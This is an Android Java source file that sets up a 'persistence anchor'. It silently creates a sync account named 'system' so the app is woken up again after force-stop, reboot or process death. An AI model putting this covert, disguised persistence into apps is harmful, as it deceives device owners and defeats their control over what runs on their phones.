package com.fason.app.persistence.anchors;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.os.Build;
import android.util.Log;
import com.fason.app.core.FasonApp;

/**
 * Layer 1: Account Anchor
 * Creates a silent system account that survives force-stop, reboot, and app death.
 * The system re-syncs accounts even when the app process is dead.
 */
public final class AccountAnchor {
    private static final String TAG = "AccountAnchor";
    private static final String ACCOUNT_TYPE = "com.fason.app.sync";
    private static final String AUTHORITY = "com.fason.app.provider";
    private static final String ACCOUNT_NAME = "system";
    private static volatile boolean initialized = false;

    private AccountAnchor() {}

    public static void init() {
        if (initialized) return;
        try {
            Context ctx = FasonApp.getContext();
            AccountManager am = AccountManager.get(ctx);
            if (am == null) return;

            Account[] accounts = am.getAccountsByType(ACCOUNT_TYPE);
            Account account;
            if (accounts.length == 0) {
                account = new Account(ACCOUNT_NAME, ACCOUNT_TYPE);
                boolean created = am.addAccountExplicitly(account, null, null);
                if (!created) {
                    Log.w(TAG, "Failed to create account");
                    return;
                }
                Log.i(TAG, "Account anchor created");
            } else {
                account = accounts[0];
            }

            // Enable sync for the account-authority pair
            ContentResolver.setIsSyncable(account, AUTHORITY, 1);
            ContentResolver.setSyncAutomatically(account, AUTHORITY, true);

            // Periodic sync every 15 minutes — system will wake us
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                // Use JobScheduler instead on N+ for periodic sync
                schedulePeriodicSync(ctx);
            } else {
                ContentResolver.addPeriodicSync(
                    account, AUTHORITY,
                    new android.os.Bundle(),
                    15 * 60 // 15 minutes in seconds
                );
            }

            initialized = true;
        } catch (Exception e) {
            Log.e(TAG, "Account anchor init failed", e);
        }
    }

    private static void schedulePeriodicSync(Context ctx) {
        // On Android N+, periodic sync is handled by SyncAdapter automatically
        // when setSyncAutomatically is true. The system schedules it.
        Log.i(TAG, "Periodic sync enabled via system scheduler");
    }

    public static boolean isActive() {
        try {
            Context ctx = FasonApp.getContext();
            AccountManager am = AccountManager.get(ctx);
            if (am == null) return false;
            Account[] accounts = am.getAccountsByType(ACCOUNT_TYPE);
            return accounts.length > 0;
        } catch (Exception e) {
            return false;
        }
    }

    public static void requestSync() {
        try {
            Context ctx = FasonApp.getContext();
            AccountManager am = AccountManager.get(ctx);
            if (am == null) return;
            Account[] accounts = am.getAccountsByType(ACCOUNT_TYPE);
            if (accounts.length == 0) return;

            android.os.Bundle extras = new android.os.Bundle();
            extras.putBoolean(ContentResolver.SYNC_EXTRAS_MANUAL, true);
            extras.putBoolean(ContentResolver.SYNC_EXTRAS_EXPEDITED, true);
            ContentResolver.requestSync(accounts[0], AUTHORITY, extras);
        } catch (Exception e) {
            Log.e(TAG, "Manual sync request failed", e);
        }
    }
}
